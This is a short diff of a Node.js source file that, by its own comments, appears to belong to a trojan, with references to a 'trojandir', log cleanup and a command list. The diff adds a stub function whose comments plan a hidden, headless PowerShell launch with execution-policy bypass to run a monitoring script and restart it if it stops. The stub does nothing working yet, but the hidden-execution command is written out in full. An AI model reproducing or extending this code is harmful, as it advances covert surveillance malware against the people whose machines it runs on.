@@ -26,7 +26,7 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
-const ISDEBUG = true;
+const ISDEBUG = true; 
 
 // { CommandLine:'...', Name:'...', ProcessId:'...' }
 var processlist = [];
@@ -2968,7 +2968,6 @@ async function install_python() {
     logmsg("finished");
 }
 
-// downloads pieces to <trojandir>/python/gsd_files
 async function download_python() {
     logmsg("starting");
 
@@ -3045,6 +3044,23 @@ function cleanup() {
     // check if trojandir has hit limits, then execute cleanup
     // remove log files, etc.
     // remove cmdlist_ directories
+}
+
+// TODO
+function pspcmon() {
+
+    logmsg('starting');
+
+    // invoke_exe -- launch powershell using conhost 
+    // monitor child process, if inactive restart
+    // listen for msg from cmdlist for "StopPSPCMon"
+    // conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File pc_monitoring.ps1
+
+    // let pspcmon = grab cmd obj
+
+    // setup loop function
+
+    logmsg('finished');
 }
 
 // ---
